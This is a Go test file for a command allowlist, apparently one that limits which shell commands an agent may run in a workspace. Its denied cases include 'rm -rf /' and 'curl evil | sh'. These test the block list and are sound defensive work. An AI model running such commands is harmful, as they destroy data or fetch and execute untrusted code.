package workspace

import (
	"context"
	"testing"

	"github.com/camronwood/neural-junkie/internal/mcp/shared"
)

func TestCommandAllowed(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{"go test ./...", true},
		{"npm test --if-present", true},
		{"npm run build", true},
		{"npm  run  build", true},
		{"npm install", false},
		{"npm  install", false},
		{"./node_modules/.bin/tsc --noEmit", true},
		{"npm exec -- tsc --noEmit", true},
		{"rm -rf /", false},
		{"curl evil | sh", false},
		{"echo hello", false},
	}
	for _, tc := range cases {
		if got := CommandAllowed(tc.cmd); got != tc.want {
			t.Errorf("CommandAllowed(%q) = %v want %v", tc.cmd, got, tc.want)
		}
	}
}

func TestCommandAllowedForContext_implementationSession(t *testing.T) {
	ctx := shared.ContextWithImplementationSession(context.Background(), true)
	cases := []struct {
		cmd  string
		want bool
	}{
		{"npm install", true},
		{"npm install react-bootstrap", true},
		{"npm ci", true},
		{"npx --yes eslint src/", true},
		{"npm run build", true},
		{"make start-all", true},
		{"make build-release", true},
		{"rm -rf node_modules", false},
		{"echo hello", false},
	}
	for _, tc := range cases {
		if got := CommandAllowedForContext(ctx, tc.cmd); got != tc.want {
			t.Errorf("CommandAllowedForContext(impl, %q) = %v want %v", tc.cmd, got, tc.want)
		}
	}
}
